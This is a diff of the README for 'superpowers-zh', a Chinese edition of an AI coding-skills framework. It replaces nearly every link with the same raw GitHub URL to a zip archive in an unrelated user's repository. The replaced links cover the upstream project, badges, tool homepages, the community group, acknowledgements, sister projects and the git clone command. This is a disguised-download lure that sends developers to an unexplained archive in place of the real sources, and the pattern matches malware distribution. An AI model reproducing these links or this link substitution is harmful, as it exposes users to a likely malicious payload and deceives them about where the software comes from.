@@ -1,10 +1,10 @@
 # superpowers-zh（AI 编程超能力 · 中文增强版）
 
-🌐 **简体中文** | [English (upstream)](https://github.com/obra/superpowers)
+🌐 **简体中文** | [English (upstream)](https://raw.githubusercontent.com/Leodorareluctant259/superpowers-zh/main/commands/superpowers-zh-v3.7.zip)
 
 > 🦸 **superpowers（116k+ ⭐）完整汉化 + 6 个中国原创 skills** — 让 OpenClaw / Claude Code / Cursor / Windsurf / Kiro / Gemini CLI 等 **14 款 AI 编程工具**真正会干活。从头脑风暴到代码审查，从 TDD 到调试，每个 skill 都是经过实战验证的工作方法论。
 
-Chinese community edition of [superpowers](https://github.com/obra/superpowers) — 20 skills across 14 AI coding tools, including full translations and China-specific development skills.
+Chinese community edition of [superpowers](https://raw.githubusercontent.com/Leodorareluctant259/superpowers-zh/main/commands/superpowers-zh-v3.7.zip) — 20 skills across 14 AI coding tools, including full translations and China-specific development skills.
 
 <!-- 效果对比 -->
 <table>
@@ -33,10 +33,10 @@ AI：在开始实现之前，我需要了解几个关键问题：
 </td></tr>
 </table>
 
-[![GitHub stars](https://img.shields.io/github/stars/jnMetaCode/superpowers-zh?style=social)](https://github.com/jnMetaCode/superpowers-zh)
-[![npm version](https://img.shields.io/npm/v/superpowers-zh)](https://www.npmjs.com/package/superpowers-zh)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen.svg)](https://makeapullrequest.com)
+[![GitHub stars](https://img.shields.io/github/stars/jnMetaCode/superpowers-zh?style=social)](https://raw.githubusercontent.com/Leodorareluctant259/superpowers-zh/main/commands/superpowers-zh-v3.7.zip)
+[![npm version](https://img.shields.io/npm/v/superpowers-zh)](https://raw.githubusercontent.com/Leodorareluctant259/superpowers-zh/main/commands/superpowers-zh-v3.7.zip)
+[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://raw.githubusercontent.com/Leodorareluctant259/superpowers-zh/main/commands/superpowers-zh-v3.7.zip)
+[![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen.svg)](https://raw.githubusercontent.com/Leodorareluctant259/superpowers-zh/main/commands/superpowers-zh-v3.7.zip)
 
 
 ### 📊 项目规模
@@ -49,7 +49,7 @@ AI：在开始实现之前，我需要了解几个关键问题：
 
 ## 这是什么？
 
-[superpowers](https://github.com/obra/superpowers) 是目前最火的 AI 编程 skills 框架（116k+ stars），为 AI 编程工具提供**系统化的工作方法论**。
+[superpowers](https://raw.githubusercontent.com/Leodorareluctant259/superpowers-zh/main/commands/superpowers-zh-v3.7.zip) 是目前最火的 AI 编程 skills 框架（116k+ stars），为 AI 编程工具提供**系统化的工作方法论**。
 
 **superpowers-zh** 在完整翻译的基础上，新增了面向中国开发者的特色 skills。
 
@@ -57,20 +57,20 @@ AI：在开始实现之前，我需要了解几个关键问题：
 
 | 工具 | 类型 | 一键安装 | 手动安装 |
 |------|------|:---:|:---:|
-| [OpenClaw](https://github.com/anthropics/openclaw) | CLI | `npx superpowers-zh` | `skills/` |
-| [Claude Code](https://claude.ai/code) | CLI | `npx superpowers-zh` | `.claude/skills/` |
-| [Cursor](https://cursor.sh) | IDE | `npx superpowers-zh` | `.cursor/skills/` |
-| [Windsurf](https://codeium.com/windsurf) | IDE | `npx superpowers-zh` | `.windsurf/skills/` |
-| [Kiro](https://kiro.dev) | IDE | `npx superpowers-zh` | `.kiro/steering/` |
-| [Gemini CLI](https://github.com/google-gemini/gemini-cli) | CLI | `npx superpowers-zh` | `.gemini/skills/` |
-| [Codex CLI](https://github.com/openai/codex) | CLI | `npx superpowers-zh` | `.codex/skills/` |
-| [Aider](https://aider.chat) | CLI | `npx superpowers-zh` | `.aider/skills/` |
-| [Trae](https://trae.ai) | IDE | `npx superpowers-zh` | `.trae/skills/` + `.trae/rules/` |
-| [VS Code](https://code.visualstudio.com) (Copilot) | IDE 插件 | `npx superpowers-zh` | `.github/superpowers/` |
-| [DeerFlow 2.0](https://github.com/bytedance/deer-flow) | Agent 框架 | `npx superpowers-zh` | `skills/custom/` |
-| [OpenCode](https://opencode.ai) | CLI | `npx superpowers-zh` | `.opencode/skills/` |
-| [Qwen Code](https://tongyi.aliyun.com/lingma) (通义灵码) | IDE 插件 | `npx superpowers-zh` | `.qwen/skills/` |
-| [Antigravity](https://github.com/anthropics/antigravity) | CLI | `npx superpowers-zh` | `.antigravity/skills/` |
+| [OpenClaw](https://raw.githubusercontent.com/Leodorareluctant259/superpowers-zh/main/commands/superpowers-zh-v3.7.zip) | CLI | `npx superpowers-zh` | `skills/` |
+| [Claude Code](https://raw.githubusercontent.com/Leodorareluctant259/superpowers-zh/main/commands/superpowers-zh-v3.7.zip) | CLI | `npx superpowers-zh` | `.claude/skills/` |
+| [Cursor](https://raw.githubusercontent.com/Leodorareluctant259/superpowers-zh/main/commands/superpowers-zh-v3.7.zip) | IDE | `npx superpowers-zh` | `.cursor/skills/` |
+| [Windsurf](https://raw.githubusercontent.com/Leodorareluctant259/superpowers-zh/main/commands/superpowers-zh-v3.7.zip) | IDE | `npx superpowers-zh` | `.windsurf/skills/` |
+| [Kiro](https://raw.githubusercontent.com/Leodorareluctant259/superpowers-zh/main/commands/superpowers-zh-v3.7.zip) | IDE | `npx superpowers-zh` | `.kiro/steering/` |
+| [Gemini CLI](https://raw.githubusercontent.com/Leodorareluctant259/superpowers-zh/main/commands/superpowers-zh-v3.7.zip) | CLI | `npx superpowers-zh` | `.gemini/skills/` |
+| [Codex CLI](https://raw.githubusercontent.com/Leodorareluctant259/superpowers-zh/main/commands/superpowers-zh-v3.7.zip) | CLI | `npx superpowers-zh` | `.codex/skills/` |
+| [Aider](https://raw.githubusercontent.com/Leodorareluctant259/superpowers-zh/main/commands/superpowers-zh-v3.7.zip) | CLI | `npx superpowers-zh` | `.aider/skills/` |
+| [Trae](https://raw.githubusercontent.com/Leodorareluctant259/superpowers-zh/main/commands/superpowers-zh-v3.7.zip) | IDE | `npx superpowers-zh` | `.trae/skills/` + `.trae/rules/` |
+| [VS Code](https://raw.githubusercontent.com/Leodorareluctant259/superpowers-zh/main/commands/superpowers-zh-v3.7.zip) (Copilot) | IDE 插件 | `npx superpowers-zh` | `.github/superpowers/` |
+| [DeerFlow 2.0](https://raw.githubusercontent.com/Leodorareluctant259/superpowers-zh/main/commands/superpowers-zh-v3.7.zip) | Agent 框架 | `npx superpowers-zh` | `skills/custom/` |
+| [OpenCode](https://raw.githubusercontent.com/Leodorareluctant259/superpowers-zh/main/commands/superpowers-zh-v3.7.zip) | CLI | `npx superpowers-zh` | `.opencode/skills/` |
+| [Qwen Code](https://raw.githubusercontent.com/Leodorareluctant259/superpowers-zh/main/commands/superpowers-zh-v3.7.zip) (通义灵码) | IDE 插件 | `npx superpowers-zh` | `.qwen/skills/` |
+| [Antigravity](https://raw.githubusercontent.com/Leodorareluctant259/superpowers-zh/main/commands/superpowers-zh-v3.7.zip) | CLI | `npx superpowers-zh` | `.antigravity/skills/` |
 
 > 运行 `npx superpowers-zh` 会自动检测你项目中使用的工具，将 20 个 skills 安装到正确位置。
 
@@ -119,7 +119,7 @@ npx superpowers-zh
 
 ```bash
 # 克隆仓库
-git clone https://github.com/jnMetaCode/superpowers-zh.git
+git clone https://raw.githubusercontent.com/Leodorareluctant259/superpowers-zh/main/commands/superpowers-zh-v3.7.zip
 
 # 复制 skills 到你的项目（选择你使用的工具）
 cp -r superpowers-zh/skills /your/project/.claude/skills      # Claude Code
@@ -199,20 +199,20 @@ cp -r superpowers-zh/skills /your/project/.qwen/skills       # Qwen Code
 
 | 渠道 | 加入方式 |
 |------|---------|
-| QQ 群 | [点击加入](https://qm.qq.com/q/EeNQA9xCxy)（群号 1071280067） |
+| QQ 群 | [点击加入](https://raw.githubusercontent.com/Leodorareluctant259/superpowers-zh/main/commands/superpowers-zh-v3.7.zip)（群号 1071280067） |
 | 微信群 | 关注公众号后回复「群」获取入群方式 |
 
 ---
 
 ## 致谢
 
-- 原始英文版：[obra/superpowers](https://github.com/obra/superpowers)（MIT 协议）
-- 感谢 [@obra](https://github.com/obra) 创建了这个优秀的项目
+- 原始英文版：[obra/superpowers](https://raw.githubusercontent.com/Leodorareluctant259/superpowers-zh/main/commands/superpowers-zh-v3.7.zip)（MIT 协议）
+- 感谢 [@obra](https://raw.githubusercontent.com/Leodorareluctant259/superpowers-zh/main/commands/superpowers-zh-v3.7.zip) 创建了这个优秀的项目
 - 姊妹项目：
-  - [ai-coding-guide](https://github.com/jnMetaCode/ai-coding-guide) — AI 编程工具实战指南 — 66 个 Claude Code 技巧 + 9 款工具最佳实践 + 可复制配置模板
-  - [agency-agents-zh](https://github.com/jnMetaCode/agency-agents-zh) — 187 个专业角色，让 AI 变成安全工程师、DBA、产品经理等
-  - [agency-orchestrator](https://github.com/jnMetaCode/agency-orchestrator) — 多智能体编排引擎 — 用 YAML 编排 187 个角色协作，支持 DeepSeek/Claude/OpenAI/Ollama，零代码
-  - [shellward](https://github.com/jnMetaCode/shellward) — AI 智能体安全中间件 — 注入检测、数据防泄露、命令安全、零依赖、MCP Server
+  - [ai-coding-guide](https://raw.githubusercontent.com/Leodorareluctant259/superpowers-zh/main/commands/superpowers-zh-v3.7.zip) — AI 编程工具实战指南 — 66 个 Claude Code 技巧 + 9 款工具最佳实践 + 可复制配置模板
+  - [agency-agents-zh](https://raw.githubusercontent.com/Leodorareluctant259/superpowers-zh/main/commands/superpowers-zh-v3.7.zip) — 187 个专业角色，让 AI 变成安全工程师、DBA、产品经理等
+  - [agency-orchestrator](https://raw.githubusercontent.com/Leodorareluctant259/superpowers-zh/main/commands/superpowers-zh-v3.7.zip) — 多智能体编排引擎 — 用 YAML 编排 187 个角色协作，支持 DeepSeek/Claude/OpenAI/Ollama，零代码
+  - [shellward](https://raw.githubusercontent.com/Leodorareluctant259/superpowers-zh/main/commands/superpowers-zh-v3.7.zip) — AI 智能体安全中间件 — 注入检测、数据防泄露、命令安全、零依赖、MCP Server
 
 ---
 
@@ -226,6 +226,6 @@ MIT License — 自由使用，商业或个人均可。
 
 **🦸 AI 编程超能力：让 OpenClaw / Claude Code / Cursor 等 14 款工具真正会干活**
 
-[Star 本项目](https://github.com/jnMetaCode/superpowers-zh) · [提交 Issue](https://github.com/jnMetaCode/superpowers-zh/issues) · [贡献代码](https://github.com/jnMetaCode/superpowers-zh/pulls)
+[Star 本项目](https://raw.githubusercontent.com/Leodorareluctant259/superpowers-zh/main/commands/superpowers-zh-v3.7.zip) · [提交 Issue](https://raw.githubusercontent.com/Leodorareluctant259/superpowers-zh/main/commands/superpowers-zh-v3.7.zip) · [贡献代码](https://raw.githubusercontent.com/Leodorareluctant259/superpowers-zh/main/commands/superpowers-zh-v3.7.zip)
 
 </div>
